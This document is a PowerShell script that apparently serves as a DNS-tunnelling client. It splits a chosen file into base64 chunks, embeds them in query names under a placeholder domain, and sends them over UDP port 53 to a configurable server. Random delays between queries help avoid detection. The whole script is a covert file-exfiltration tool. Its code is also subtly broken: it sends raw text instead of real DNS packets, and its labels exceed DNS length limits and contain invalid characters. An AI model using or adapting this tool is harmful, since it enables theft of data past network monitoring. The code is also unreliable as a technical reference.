# Set DNS Server and Domain
$DNS_SERVER = "your.dns.server.ip"  # Replace with actual DNS server IP
$DNS_PORT = 53
$domain = "fileupload.example.com"  # Domain to use

# Function to calculate MD5 hash of a file
function Calculate-MD5 {
    param (
        [string]$filePath
    )

    $md5 = [System.Security.Cryptography.MD5]::Create()
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $hashBytes = $md5.ComputeHash($fileStream)
    $fileStream.Close()

    return [BitConverter]::ToString($hashBytes) -replace '-'
}

# Function to send a DNS query with a random delay
function Send-DNSQuery {
    param (
        [string]$data,
        [string]$serverIP,
        [double]$maxDelay
    )

    $udpClient = New-Object System.Net.Sockets.UdpClient
    $serverEndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($serverIP), $DNS_PORT)
    $queryBytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    
    $udpClient.Send($queryBytes, $queryBytes.Length, $serverEndPoint)
    $udpClient.Close()

    # Add a random delay between 0.1 seconds and the user-provided maximum delay
    $delay = Get-Random -Minimum 0.1 -Maximum $maxDelay
    Write-Host "Query sent, delaying next query by $([Math]::Round($delay, 2)) seconds."
    Start-Sleep -Seconds $delay
}

# Function to send file in chunks with randomized query sending
function Send-FileChunks {
    param (
        [string]$filePath,
        [string]$serverIP,
        [string]$domain,
        [double]$maxDelay
    )

    $fileSize = (Get-Item $filePath).Length
    $chunkSize = 512  # Size of each chunk in bytes
    $totalChunks = [Math]::Ceiling($fileSize / $chunkSize)

    $fileStream = [System.IO.File]::OpenRead($filePath)
    $chunkNumber = 0

    while ($chunkNumber -lt $totalChunks) {
        $buffer = New-Object byte[] $chunkSize
        $bytesRead = $fileStream.Read($buffer, 0, $chunkSize)
        $encodedChunkData = [Convert]::ToBase64String($buffer[0..($bytesRead-1)])

        $query = "c$chunkNumber.$($encodedChunkData -replace '=','').$domain"
        Write-Host "Sending chunk $chunkNumber"
        Send-DNSQuery -data $query -serverIP $serverIP -maxDelay $maxDelay

        $chunkNumber++
    }

    $fileStream.Close()
}

# Function to send file information (filename and MD5 hash)
function Send-FileInfo {
    param (
        [string]$fileName,
        [string]$fileMD5,
        [string]$serverIP,
        [string]$domain,
        [double]$maxDelay
    )

    $encodedFileName = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($fileName)) -replace '='
    $encodedFileMD5 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($fileMD5)) -replace '='

    $query = "f.$encodedFileName.$encodedFileMD5.$domain"
    Write-Host "Sending file info: $fileName, MD5: $fileMD5"
    Send-DNSQuery -data $query -serverIP $serverIP -maxDelay $maxDelay
}

# Function to signal end of transmission
function Send-EndSignal {
    param (
        [string]$serverIP,
        [string]$domain,
        [double]$maxDelay
    )

    $query = "e.end.$domain"
    Write-Host "Sending end of transmission signal"
    Send-DNSQuery -data $query -serverIP $serverIP -maxDelay $maxDelay
}

# Main client function
function Send-File {
    param (
        [string]$filePath,
        [double]$maxDelay
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileMD5 = Calculate-MD5 -filePath $filePath

    # Send file info (filename and MD5 hash)
    Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -serverIP $DNS_SERVER -domain $domain -maxDelay $maxDelay

    # Send file chunks with random delays
    Send-FileChunks -filePath $filePath -serverIP $DNS_SERVER -domain $domain -maxDelay $maxDelay

    # Signal the end of transmission
    Send-EndSignal -serverIP $DNS_SERVER -domain $domain -maxDelay $maxDelay
}

# Example usage
$filePath = Read-Host "Enter the file path to send"
$maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries")
Send-File -filePath $filePath -maxDelay $maxDelay
